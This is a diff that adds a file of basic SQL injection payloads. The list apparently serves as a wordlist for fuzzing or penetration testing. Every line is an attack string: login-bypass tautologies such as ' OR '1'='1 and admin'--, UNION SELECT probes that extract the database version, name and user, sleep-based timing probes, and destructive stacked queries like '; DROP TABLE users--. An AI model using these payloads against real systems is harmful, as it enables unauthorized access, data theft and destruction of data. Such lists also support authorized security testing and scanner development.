@@ -1,0 +1,43 @@
+# Basic SQL Injection Payloads
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 'a'='a
+" OR "a"="a
+') OR ('1'='1
+") OR ("1"="1
+' UNION SELECT null--
+" UNION SELECT null--
+' AND 1=1--
+" AND 1=1--
+' AND 1=2--
+" AND 1=2--
+admin'--
+admin"--
+admin') --
+admin") --
+' OR username='admin'--
+" OR username="admin"--
+' OR password='password'--
+" OR password="password"--
+1' OR '1'='1
+1" OR "1"="1
+' UNION ALL SELECT null--
+" UNION ALL SELECT null--
+' OR 'x'='x
+" OR "x"="x
+' OR sleep(5)--
+" OR sleep(5)--
+1; DROP TABLE users--
+'; DROP TABLE users--
+' OR 1=1#
+" OR 1=1#
+' UNION SELECT 1,2,3--
+" UNION SELECT 1,2,3--
+' UNION SELECT version()--
+" UNION SELECT version()--
+' UNION SELECT database()--
+" UNION SELECT database()--
+' UNION SELECT user()--
+" UNION SELECT user()--
